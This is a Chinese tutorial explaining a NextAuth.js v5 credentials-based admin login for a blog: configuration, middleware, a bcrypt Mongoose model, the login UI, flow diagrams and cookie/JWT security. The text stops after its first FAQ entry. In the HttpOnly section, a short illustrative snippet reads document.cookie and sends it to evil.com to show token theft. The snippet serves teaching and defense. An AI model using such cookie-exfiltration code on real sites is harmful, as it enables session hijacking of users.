# NextAuth.js v5 登录系统完整解析

> TFT Blog 项目管理员认证系统实现指南
>
> 本文档详细讲解基于 NextAuth.js v5 的登录系统实现原理和完整流程

---

## 📚 目录

- [一、核心概念](#一核心概念)
- [二、文件详解](#二文件详解)
- [三、完整登录流程](#三完整登录流程)
- [四、安全机制](#四安全机制)
- [五、常见问题](#五常见问题)
- [六、实验练习](#六实验练习)

---

## 一、核心概念

### 1.1 认证流程图

```
用户输入账号密码
    ↓
前端调用 signIn()
    ↓
POST /api/auth/callback/credentials
    ↓
NextAuth 调用 authorize() 验证
    ↓
查询数据库，验证密码
    ↓
生成 JWT Token
    ↓
设置 HttpOnly Cookie
    ↓
返回成功/失败
    ↓
前端重定向到目标页面
```

### 1.2 技术栈

- **NextAuth.js v5** (Auth.js) - 认证框架
- **JWT** - Token 格式
- **bcrypt** - 密码哈希算法
- **MongoDB + Mongoose** - 用户数据存储
- **HttpOnly Cookie** - Token 存储方式

### 1.3 关键组件

| 组件 | 作用 | 位置 |
|------|------|------|
| NextAuth 配置 | 定义认证策略和回调 | `auth.ts` |
| API 路由 | 处理所有认证请求 | `app/api/auth/[...nextauth]/route.ts` |
| 中间件 | 保护路由，检查权限 | `middleware.ts` |
| Admin 模型 | 存储用户数据 | `models/Admin.ts` |
| 登录页面 | 用户界面 | `app/login/page.tsx` |

---

## 二、文件详解

### 2.1 `auth.ts` - NextAuth 核心配置

**作用**: NextAuth.js 的核心配置文件，定义认证提供者、Session 策略、回调函数等。

```typescript
import NextAuth, { NextAuthConfig } from 'next-auth';
import CredentialsProvider from 'next-auth/providers/credentials';
import dbConnect from '@/lib/mongodb';
import Admin from '@/models/Admin';

export const authConfig: NextAuthConfig = {
  // ============================================================
  // 1️⃣ 配置认证提供者（Providers）
  // ============================================================
  providers: [
    CredentialsProvider({
      // 提供者名称
      name: 'Credentials',

      // 定义登录表单字段
      credentials: {
        email: {
          label: '邮箱',
          type: 'email',
          placeholder: 'admin@tftblog.com',
        },
        password: {
          label: '密码',
          type: 'password',
        },
      },

      // ============================================================
      // 2️⃣ 核心认证逻辑 - authorize 函数
      // ============================================================
      // 当用户提交登录表单时，NextAuth 会调用这个函数
      async authorize(credentials) {
        // 步骤 1: 验证输入
        if (!credentials?.email || !credentials?.password) {
          throw new Error('请输入邮箱和密码');
        }

        // 步骤 2: 连接数据库
        await dbConnect();

        // 步骤 3: 查找用户
        const admin = await Admin.findOne({
          email: (credentials.email as string).toLowerCase(),
        });

        if (!admin) {
          // 安全提示：不暴露具体是邮箱还是密码错误
          throw new Error('邮箱或密码错误');
        }

        // 步骤 4: 验证密码（使用 bcrypt）
        const isValid = await admin.comparePassword(
          credentials.password as string
        );

        if (!isValid) {
          throw new Error('邮箱或密码错误');
        }

        // ✅ 步骤 5: 返回用户信息（不含密码）
        // 这些信息会被传递到 jwt() 回调
        return {
          id: admin._id.toString(),
          email: admin.email,
          name: admin.name,
          role: admin.role,
        };
      },
    }),
  ],

  // ============================================================
  // 3️⃣ Session 配置
  // ============================================================
  session: {
    strategy: 'jwt',              // 使用 JWT 而非数据库 session
    maxAge: 7 * 24 * 60 * 60,     // 7 天有效期（单位：秒）
  },

  // ============================================================
  // 4️⃣ 自定义页面路径
  // ============================================================
  pages: {
    signIn: '/login',       // 登录页面路径
    error: '/login',        // 错误页面（登录失败时显示）
  },

  // ============================================================
  // 5️⃣ 回调函数（Callbacks）
  // ============================================================
  callbacks: {
    // ------------------------------------------------------------
    // JWT 回调：在创建/更新 token 时调用
    // ------------------------------------------------------------
    // 时机：
    // - 用户首次登录
    // - 每次请求时刷新 token
    async jwt({ token, user }) {
      if (user) {
        // 首次登录时，将 authorize() 返回的 user 信息存入 token
        token.id = user.id;
        token.email = user.email;
        token.name = user.name;
        token.role = (user as any).role;
      }
      // 返回的 token 会被加密并存储在 Cookie 中
      return token;
    },

    // ------------------------------------------------------------
    // Session 回调：在获取 session 时调用
    // ------------------------------------------------------------
    // 时机：
    // - 调用 auth() 或 getSession() 时
    // - 服务端/客户端获取 session 数据时
    async session({ session, token }) {
      // 将 token 中的信息传递到 session
      // 这样前端就可以访问这些数据
      if (token && session.user) {
        (session.user as AdminUser).id = token.id as string;
        (session.user as AdminUser).email = token.email as string;
        (session.user as AdminUser).name = token.name as string;
        (session.user as AdminUser).role = token.role as 'admin';
      }
      return session;
    },
  },

  // ============================================================
  // 6️⃣ 安全配置
  // ============================================================
  secret: process.env.NEXTAUTH_SECRET,      // JWT 签名密钥
  debug: process.env.NODE_ENV === 'development', // 开发模式启用调试日志
};

// ============================================================
// 7️⃣ 导出认证函数
// ============================================================
export const { handlers, signIn, signOut, auth } = NextAuth(authConfig);
```

**关键点**：

- **`authorize()`**: 最核心的函数，负责验证用户身份
- **`jwt()` 回调**: 控制 JWT Token 包含哪些信息
- **`session()` 回调**: 控制前端可以访问哪些数据
- **`strategy: 'jwt'`**: 使用 JWT 而非数据库 session，性能更好

---

### 2.2 `middleware.ts` - 路由保护

**作用**: 在每个请求到达页面前拦截，检查用户是否已登录，保护需要认证的路由。

```typescript
import { auth } from '@/auth';
import { NextResponse } from 'next/server';

/**
 * 路由保护中间件
 *
 * 工作原理：
 * 1. Next.js 在每个匹配的请求前调用此函数
 * 2. auth() 包装器自动读取并验证 JWT Cookie
 * 3. 如果 Token 有效，注入 req.auth 对象
 * 4. 根据登录状态决定放行或重定向
 */
export default auth((req) => {
  const { pathname } = req.nextUrl;

  // 检查用户是否已登录
  // req.auth 由 NextAuth 自动注入，包含 session 信息
  const isLoggedIn = !!req.auth;

  // ------------------------------------------------------------
  // 定义需要保护的路径
  // ------------------------------------------------------------
  const protectedPaths = ['/dashboard'];
  const isProtectedPath = protectedPaths.some((path) =>
    pathname.startsWith(path)
  );

  // ------------------------------------------------------------
  // 场景 1: 未登录访问受保护路由
  // ------------------------------------------------------------
  if (isProtectedPath && !isLoggedIn) {
    // 构建登录页面 URL
    const loginUrl = new URL('/login', req.url);

    // 保存用户原本想访问的页面
    // 登录成功后可以重定向回去
    loginUrl.searchParams.set('callbackUrl', pathname);

    // 重定向到登录页
    return NextResponse.redirect(loginUrl);
  }

  // ------------------------------------------------------------
  // 场景 2: 已登录访问登录页
  // ------------------------------------------------------------
  if (pathname === '/login' && isLoggedIn) {
    // 重定向到控制台（避免重复登录）
    return NextResponse.redirect(new URL('/dashboard', req.url));
  }

  // ------------------------------------------------------------
  // 场景 3: 其他情况
  // ------------------------------------------------------------
  // 放行，继续处理请求
  return NextResponse.next();
});

// ============================================================
// 配置中间件匹配规则
// ============================================================
// 只对以下路径生效，其他路径不会触发中间件
export const config = {
  matcher: [
    '/dashboard/:path*',      // 控制台所有子路由
    '/login',                 // 登录页面
    '/api/dashboard/:path*',  // 控制台 API 路由
  ],
};
```

**执行流程**：

```
1. 用户请求 /dashboard
   ↓
2. Next.js 调用 middleware.ts
   ↓
3. auth() 包装器读取 Cookie: next-auth.session-token
   ↓
4. 解密并验证 JWT
   ↓
5. 有效 → req.auth = { user: {...} }
   无效 → req.auth = null
   ↓
6. 检查 isLoggedIn = !!req.auth
   ↓
7. 未登录 → 重定向到 /login?callbackUrl=/dashboard
   已登录 → NextResponse.next() 继续渲染页面
```

---

### 2.3 `models/Admin.ts` - 管理员数据模型

**作用**: 定义管理员数据结构，实现密码哈希和验证功能。

```typescript
import mongoose from 'mongoose';
import bcrypt from 'bcryptjs';

/**
 * 管理员接口定义
 */
export interface IAdmin {
  email: string;
  password: string;
  name: string;
  role: 'admin';
  createdAt: Date;
  updatedAt: Date;
}

/**
 * Mongoose Schema 定义
 */
const AdminSchema = new mongoose.Schema<IAdmin>(
  {
    email: {
      type: String,
      required: true,
      unique: true,        // 唯一索引
      lowercase: true,     // 自动转小写
      trim: true,          // 去除空格
      index: true,         // 创建索引提高查询速度
    },
    password: {
      type: String,
      required: true,
      minlength: 6,        // 最少 6 个字符
    },
    name: {
      type: String,
      required: true,
      default: 'Admin',
    },
    role: {
      type: String,
      default: 'admin',
      enum: ['admin'],     // 只允许 'admin' 值
    },
  },
  {
    timestamps: true,      // 自动添加 createdAt 和 updatedAt
  }
);

// ============================================================
// Mongoose 中间件：保存前自动哈希密码
// ============================================================
/**
 * pre('save') 中间件
 * 在文档保存到数据库前执行
 *
 * 作用：自动将明文密码转换为哈希值
 */
AdminSchema.pre('save', async function (next) {
  // 仅在密码被修改时才重新哈希
  // 避免每次保存都重新哈希（比如更新 name 字段）
  if (!this.isModified('password')) return next();

  // 使用 bcrypt 哈希密码
  // 参数说明：
  // - this.password: 明文密码
  // - 12: salt rounds（计算复杂度），值越大越安全但越慢
  this.password = await bcrypt.hash(this.password, 12);

  next(); // 继续保存流程
});

// ============================================================
// 实例方法：验证密码
// ============================================================
/**
 * 比对用户输入的密码和数据库中的哈希值
 *
 * @param candidatePassword - 用户输入的明文密码
 * @returns Promise<boolean> - 密码是否正确
 */
AdminSchema.methods.comparePassword = async function (
  candidatePassword: string
): Promise<boolean> {
  // bcrypt.compare() 会：
  // 1. 从哈希中提取 salt
  // 2. 使用相同的 salt 哈希用户输入
  // 3. 比对两个哈希值是否相同
  return await bcrypt.compare(candidatePassword, this.password);
};

// ============================================================
// 安全导出模型（避免热重载时重复注册）
// ============================================================
let Admin;
try {
  // 尝试获取已存在的模型
  Admin = mongoose.model<IAdmin>('Admin');
} catch {
  // 如果模型不存在，创建新模型
  Admin = mongoose.model<IAdmin>('Admin', AdminSchema);
}

export default Admin;
```

**bcrypt 原理**：

```
原始密码: "admin123456"
       ↓ (bcrypt.hash)
加盐值: "$2a$12$randomsalt..."
       ↓ (多轮哈希)
最终哈希: "$2a$12$randomsalt$hashedpassword..."
          └────┘ └─────────┘ └───────────────┘
          算法版本   盐值       实际哈希

验证时：
用户输入 "admin123456"
       ↓
bcrypt.compare() 提取盐值
       ↓
使用相同盐值重新哈希
       ↓
比对两个哈希 → true/false
```

**为什么安全？**

1. **盐值（Salt）**: 每个密码的哈希都不同，即使密码相同
2. **慢哈希**: Salt rounds = 12 意味着计算 2^12 = 4096 次，暴力破解成本极高
3. **单向加密**: 无法从哈希反推原密码

---

### 2.4 `app/login/page.tsx` - 登录页面

**作用**: 提供用户界面，处理登录表单提交。

```typescript
'use client'; // 标记为客户端组件（需要使用 React hooks）

import { useState, FormEvent } from 'react';
import { signIn } from 'next-auth/react';
import { useRouter, useSearchParams } from 'next/navigation';
import Link from 'next/link';

export default function LoginPage() {
  // Next.js 路由钩子
  const router = useRouter();
  const searchParams = useSearchParams();

  // 获取 URL 中的 callbackUrl 参数
  // 例如：/login?callbackUrl=/dashboard
  const callbackUrl = searchParams.get('callbackUrl') || '/dashboard';

  // 表单状态
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  // ============================================================
  // 表单提交处理函数
  // ============================================================
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault(); // 阻止默认提交行为
    setError('');       // 清除之前的错误
    setLoading(true);   // 显示加载状态

    try {
      // ------------------------------------------------------------
      // 调用 NextAuth 的 signIn 函数
      // ------------------------------------------------------------
      const result = await signIn('credentials', {
        email,
        password,
        redirect: false,  // 不自动重定向，手动控制
      });

      // ------------------------------------------------------------
      // 处理登录结果
      // ------------------------------------------------------------
      if (result?.error) {
        // ❌ 登录失败：显示错误消息
        setError(result.error);
      } else if (result?.ok) {
        // ✅ 登录成功：重定向到目标页面
        router.push(callbackUrl);
        router.refresh(); // 刷新服务端组件（更新 Navbar）
        return; // 不设置 loading = false，保持加载状态
      } else {
        // 其他情况（理论上不会出现）
        setError('登录失败，请重试');
      }
    } catch (err) {
      console.error('登录错误:', err);
      setError('登录失败，请重试');
    } finally {
      setLoading(false); // 恢复按钮状态
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 dark:bg-gray-900 px-4">
      <div className="max-w-md w-full space-y-8">
        {/* Logo 和标题 */}
        <div className="text-center">
          <Link href="/" className="text-3xl font-bold text-gray-900 dark:text-white">
            TFT Blog
          </Link>
          <h2 className="mt-6 text-2xl font-semibold text-gray-700 dark:text-gray-300">
            管理员登录
          </h2>
        </div>

        {/* 登录表单 */}
        <form onSubmit={handleSubmit} className="mt-8 space-y-6">
          <div className="rounded-md shadow-sm space-y-4">
            {/* 邮箱输入 */}
            <input
              id="email"
              name="email"
              type="email"
              required
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="appearance-none relative block w-full px-3 py-2 border border-gray-300 dark:border-gray-700 rounded-lg bg-white dark:bg-gray-800 text-gray-900 dark:text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder="邮箱地址"
            />

            {/* 密码输入 */}
            <input
              id="password"
              name="password"
              type="password"
              required
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="appearance-none relative block w-full px-3 py-2 border border-gray-300 dark:border-gray-700 rounded-lg bg-white dark:bg-gray-800 text-gray-900 dark:text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder="密码"
            />
          </div>

          {/* 错误提示 */}
          {error && (
            <div className="rounded-lg bg-red-50 dark:bg-red-900/20 p-4">
              <p className="text-sm text-red-800 dark:text-red-200">{error}</p>
            </div>
          )}

          {/* 提交按钮 */}
          <button
            type="submit"
            disabled={loading}
            className="w-full py-2 px-4 border border-transparent rounded-lg text-white bg-blue-600 hover:bg-blue-700 focus:outline-none disabled:opacity-50 transition-colors"
          >
            {loading ? '登录中...' : '登录'}
          </button>

          {/* 返回首页链接 */}
          <div className="text-center">
            <Link href="/" className="text-sm text-blue-600 dark:text-blue-400 hover:text-blue-800">
              返回首页
            </Link>
          </div>
        </form>
      </div>
    </div>
  );
}
```

**关键 API**：

- **`signIn('credentials', { ... })`**: 触发 Credentials Provider 登录
- **`redirect: false`**: 阻止自动重定向，改为手动控制
- **`result.ok`**: 布尔值，表示登录是否成功
- **`result.error`**: 字符串，包含错误消息（来自 authorize() 抛出的 Error）

---

### 2.5 `app/components/Navbar.tsx` - 导航栏

**作用**: 显示导航链接，根据登录状态显示不同内容。

```typescript
import Link from 'next/link';
import { auth, signOut } from '@/auth';

/**
 * 全局导航栏
 *
 * 关键特性：
 * 1. 服务端组件（async function）
 * 2. 直接调用 auth() 获取 session，无需客户端请求
 * 3. 使用 Server Action 实现退出功能
 */
export default async function Navbar() {
  // ------------------------------------------------------------
  // 🔍 服务端获取 session
  // ------------------------------------------------------------
  // auth() 会：
  // 1. 读取请求的 Cookie
  // 2. 解密并验证 JWT
  // 3. 返回 session 对象（或 null）
  const session = await auth();

  return (
    <nav className="bg-white dark:bg-gray-900 border-b border-gray-200 dark:border-gray-800">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="flex justify-between items-center h-16">
          {/* 左侧：Logo */}
          <div className="flex items-center">
            <Link href="/" className="text-xl font-bold text-gray-900 dark:text-white">
              TFT Blog
            </Link>
          </div>

          {/* 右侧：导航链接 */}
          <div className="flex items-center space-x-6">
            <Link href="/" className="text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
              首页
            </Link>
            <Link href="/guides" className="text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
              攻略
            </Link>
            <Link href="/about" className="text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
              关于
            </Link>

            {/* ------------------------------------------------------------
                已登录时显示的内容
                ------------------------------------------------------------ */}
            {session?.user ? (
              <>
                {/* 控制台链接 */}
                <Link href="/dashboard" className="text-blue-600 dark:text-blue-400 hover:text-blue-800 font-medium transition-colors">
                  控制台
                </Link>

                {/* 用户邮箱 */}
                <span className="text-sm text-gray-600 dark:text-gray-400">
                  {session.user.email}
                </span>

                {/* ------------------------------------------------------------
                    退出按钮（Server Action）
                    ------------------------------------------------------------ */}
                <form
                  action={async () => {
                    'use server'; // 标记为 Server Action
                    await signOut({ redirectTo: '/' });
                  }}
                >
                  <button
                    type="submit"
                    className="px-4 py-2 text-sm font-medium text-white bg-red-600 rounded-lg hover:bg-red-700 transition-colors"
                  >
                    退出
                  </button>
                </form>
              </>
            ) : null}
          </div>
        </div>
      </div>
    </nav>
  );
}
```

**Server Action 优势**：

```typescript
// ❌ 传统方式（需要客户端组件）
'use client';
import { signOut } from 'next-auth/react';

<button onClick={() => signOut()}>退出</button>

// ✅ Server Action 方式（服务端组件）
<form action={async () => {
  'use server';
  await signOut({ redirectTo: '/' });
}}>
  <button type="submit">退出</button>
</form>
```

**优点**：
- 无需客户端 JavaScript
- 更安全（在服务端执行）
- SEO 友好
- 渐进增强（JavaScript 禁用时仍可用）

---

## 三、完整登录流程

### 3.1 登录流程（Step by Step）

```
┌─────────────────────────────────────────────────────────────┐
│ 1. 用户访问 /login                                          │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 2. 输入账号密码                                             │
│    - 邮箱: admin@tftblog.com                                │
│    - 密码: admin123456                                      │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 3. 点击"登录"按钮                                           │
│    触发 handleSubmit() 函数                                 │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 4. 前端调用 signIn()                                        │
│    signIn('credentials', {                                  │
│      email: 'admin@tftblog.com',                            │
│      password: 'admin123456',                               │
│      redirect: false                                        │
│    })                                                       │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 5. NextAuth 发送 POST 请求                                  │
│    POST /api/auth/callback/credentials                      │
│    Body: { email, password, csrfToken }                     │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 6. 后端调用 authorize() 函数（auth.ts）                    │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 7. 连接数据库                                               │
│    await dbConnect()                                        │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 8. 查询用户                                                 │
│    const admin = await Admin.findOne({ email })             │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 9. 验证密码                                                 │
│    const isValid = await admin.comparePassword(password)    │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 10. bcrypt 比对哈希                                         │
│     bcrypt.compare('admin123456', hashedPassword)           │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 11. ✅ 验证成功                                             │
│     返回用户对象:                                           │
│     {                                                       │
│       id: '507f1f77bcf86cd799439011',                       │
│       email: 'admin@tftblog.com',                           │
│       name: 'Admin',                                        │
│       role: 'admin'                                         │
│     }                                                       │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 12. 触发 jwt() 回调                                         │
│     生成 JWT Token                                          │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 13. Token 内容（解密后）                                    │
│     {                                                       │
│       id: '507f1f77bcf86cd799439011',                       │
│       email: 'admin@tftblog.com',                           │
│       name: 'Admin',                                        │
│       role: 'admin',                                        │
│       iat: 1707734400,   // 签发时间                        │
│       exp: 1708339200    // 过期时间（7天后）              │
│     }                                                       │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 14. 使用 NEXTAUTH_SECRET 加密 Token                         │
│     生成签名: HMACSHA256(header + payload, secret)          │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 15. 设置 HttpOnly Cookie                                    │
│     Set-Cookie: next-auth.session-token=<encrypted-jwt>;    │
│                 HttpOnly;                                   │
│                 Secure;                                     │
│                 SameSite=Lax;                               │
│                 Path=/;                                     │
│                 Max-Age=604800                              │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 16. 返回响应到前端                                          │
│     { ok: true }                                            │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 17. 前端检测 result.ok === true                             │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 18. 重定向到控制台                                          │
│     router.push('/dashboard')                               │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 19. 中间件拦截请求                                          │
│     middleware.ts 检查 Cookie                               │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 20. 解密并验证 JWT                                          │
│     - 验证签名                                              │
│     - 检查过期时间                                          │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 21. 注入 req.auth                                           │
│     req.auth = {                                            │
│       user: {                                               │
│         id: '...',                                          │
│         email: 'admin@tftblog.com',                         │
│         name: 'Admin',                                      │
│         role: 'admin'                                       │
│       }                                                     │
│     }                                                       │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 22. ✅ 放行，渲染 /dashboard 页面                           │
└─────────────────────────────────────────────────────────────┘
```

### 3.2 访问受保护路由流程

```
┌─────────────────────────────────────────────────────────────┐
│ 1. 用户访问 /dashboard                                      │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 2. 中间件拦截（middleware.ts）                              │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 3. 读取 Cookie                                              │
│    Cookie: next-auth.session-token=<encrypted-jwt>          │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 4. 解密 JWT Token                                           │
│    使用 NEXTAUTH_SECRET 解密                                │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 5. 验证 Token                                               │
│    - 检查签名是否正确                                       │
│    - 检查是否过期（exp < 当前时间）                         │
└─────────────────────────────────────────────────────────────┘
                            ↓
        ┌───────────────────┴───────────────────┐
        ↓                                       ↓
┌───────────────────┐               ┌───────────────────┐
│ ✅ Token 有效     │               │ ❌ Token 无效     │
└───────────────────┘               └───────────────────┘
        ↓                                       ↓
┌───────────────────┐               ┌───────────────────┐
│ 注入 req.auth     │               │ req.auth = null   │
│ req.auth = {      │               └───────────────────┘
│   user: {...}     │                       ↓
│ }                 │               ┌───────────────────┐
└───────────────────┘               │ 重定向到登录页    │
        ↓                           │ /login?           │
┌───────────────────┐               │ callbackUrl=/...  │
│ isLoggedIn = true │               └───────────────────┘
└───────────────────┘
        ↓
┌───────────────────┐
│ 继续渲染页面      │
└───────────────────┘
        ↓
┌───────────────────┐
│ 页面调用 auth()   │
│ 获取完整 session  │
└───────────────────┘
        ↓
┌───────────────────┐
│ 显示用户数据      │
│ 和内容            │
└───────────────────┘
```

### 3.3 退出流程

```
┌─────────────────────────────────────────────────────────────┐
│ 1. 用户点击"退出"按钮                                       │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 2. 提交 Server Action form                                  │
│    <form action={async () => {                              │
│      'use server';                                          │
│      await signOut({ redirectTo: '/' });                    │
│    }}>                                                      │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 3. 服务端执行 signOut()                                     │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 4. NextAuth 删除 HttpOnly Cookie                            │
│    Set-Cookie: next-auth.session-token=; Max-Age=0          │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 5. 清除服务端 session                                       │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 6. 重定向到首页                                             │
│    redirectTo: '/'                                          │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 7. 浏览器发送新请求 GET /                                   │
│    Cookie: （无 session-token）                             │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 8. 中间件检测无 Cookie                                      │
│    isLoggedIn = false                                       │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 9. Navbar 调用 auth()                                       │
│    返回 null（无 session）                                  │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ 10. 不显示"控制台"链接和用户信息                            │
└─────────────────────────────────────────────────────────────┘
```

---

## 四、安全机制

### 4.1 密码安全（bcrypt）

#### 原理

```
原始密码: "admin123456"
       ↓
随机生成盐值: "randomsalt123"
       ↓
组合: "randomsalt123" + "admin123456"
       ↓
哈希（2^12 = 4096 轮）
       ↓
最终结果: "$2a$12$randomsalt123$hashedpassword..."
          └────┘ └─────────────┘ └───────────────┘
          算法版本    盐值          实际哈希
```

#### 代码示例

```typescript
// 创建用户时
const password = 'admin123456';
const hashedPassword = await bcrypt.hash(password, 12);
// 结果: $2a$12$xyz...abc

// 登录验证时
const inputPassword = '用户输入的密码';
const storedHash = '$2a$12$xyz...abc';

const isValid = await bcrypt.compare(inputPassword, storedHash);
// bcrypt 会：
// 1. 从 storedHash 提取盐值 "xyz"
// 2. 使用相同盐值哈希 inputPassword
// 3. 比对结果 → true/false
```

#### 为什么安全？

| 特性 | 说明 |
|------|------|
| **盐值（Salt）** | 每个密码哈希都包含独特的随机盐值，即使密码相同哈希也不同 |
| **慢哈希** | Salt rounds = 12 意味着计算 2^12 = 4096 次，极大增加暴力破解成本 |
| **单向加密** | 无法从哈希反推原密码，只能正向验证 |
| **防彩虹表** | 由于每个密码都有独特盐值，预计算的彩虹表无效 |

---

### 4.2 Cookie 安全（HttpOnly）

#### Cookie 属性

```http
Set-Cookie: next-auth.session-token=<encrypted-jwt>;
            HttpOnly;
            Secure;
            SameSite=Lax;
            Path=/;
            Max-Age=604800
```

| 属性 | 作用 | 防止什么攻击 |
|------|------|-------------|
| **HttpOnly** | JavaScript 无法通过 `document.cookie` 访问 | XSS 攻击 |
| **Secure** | 仅通过 HTTPS 传输（生产环境） | 中间人攻击（MITM） |
| **SameSite=Lax** | 限制跨站请求时发送 Cookie | CSRF 攻击 |
| **Path=/** | Cookie 对所有路径有效 | N/A |
| **Max-Age=604800** | 7 天后自动过期（秒） | 长期劫持 |

#### 为什么 HttpOnly 重要？

```javascript
// ❌ 没有 HttpOnly：JavaScript 可以窃取 Token
const token = document.cookie; // 可以读取
fetch('https://evil.com', { body: token }); // 发送到恶意服务器

// ✅ 有 HttpOnly：JavaScript 无法访问
console.log(document.cookie); // 看不到 next-auth.session-token
```

---

### 4.3 JWT Token 安全

#### Token 结构

JWT 由三部分组成，用 `.` 分隔：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUwN2YxZjc3YmNmODZjZDc5OTQzOTAxMSIsImVtYWlsIjoiYWRtaW5AdGZ0YmxvZy5jb20iLCJuYW1lIjoiQWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDc3MzQ0MDAsImV4cCI6MTcwODMzOTIwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└───────────────────────────────────┘ └──────────────────────────────────────────────────────────────────────────────────────────────────────────────┘ └───────────────────────────────────┘
          Header                                                        Payload                                                                           Signature
```

#### Header（算法和类型）

```json
{
  "alg": "HS256",   // HMAC SHA-256 算法
  "typ": "JWT"      // Token 类型
}
```

#### Payload（用户数据）

```json
{
  "id": "507f1f77bcf86cd799439011",
  "email": "admin@tftblog.com",
  "name": "Admin",
  "role": "admin",
  "iat": 1707734400,  // 签发时间（Issued At）
  "exp": 1708339200   // 过期时间（Expiration Time）
}
```

#### Signature（签名）

```javascript
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  NEXTAUTH_SECRET  // 密钥
)
```

#### 验证流程

```
1. 接收 JWT
   ↓
2. 分割成 header、payload、signature
   ↓
3. 使用相同密钥重新计算签名
   ↓
4. 比对计算的签名和原始签名
   ↓
5. 相同 → Token 未被篡改 → 验证通过
   不同 → Token 被修改 → 拒绝
```

#### 为什么安全？

- **无法伪造**: 没有 `NEXTAUTH_SECRET` 无法生成有效签名
- **防篡改**: 修改 payload 后签名不匹配，立即被发现
- **自包含**: 包含所有必要信息，无需查询数据库
- **有时效**: `exp` 字段确保 Token 会过期

---

### 4.4 防护总结

| 攻击类型 | 防护措施 | 实现方式 |
|---------|---------|---------|
| **密码泄露** | bcrypt 哈希 | `AdminSchema.pre('save')` |
| **XSS 攻击** | HttpOnly Cookie | NextAuth 自动设置 |
| **CSRF 攻击** | SameSite=Lax | NextAuth 自动设置 |
| **Token 伪造** | JWT 签名 | NEXTAUTH_SECRET |
| **中间人攻击** | HTTPS + Secure Cookie | 生产环境配置 |
| **暴力破解** | bcrypt 慢哈希 | Salt rounds = 12 |
| **Session 劫持** | Token 过期 | maxAge: 7 天 |
| **邮箱枚举** | 统一错误消息 | "邮箱或密码错误" |

---

## 五、常见问题

### Q1: 为什么使用 JWT 而非 Database Session？

| 方案 | 优点 | 缺点 | 适用场景 |
|------|------|------|---------|
| **JWT** | 无需数据库查询，性能好；水平扩展容易；无状态 | 无法主动撤销；Token 较大（Cookie 大） | 单管理员、低撤销需求 |
| **Database** | 可主动撤销；Token 小；更灵活 | 每次请求查数据库；需要共享 session 存储 | 多用户、需频繁撤销 |

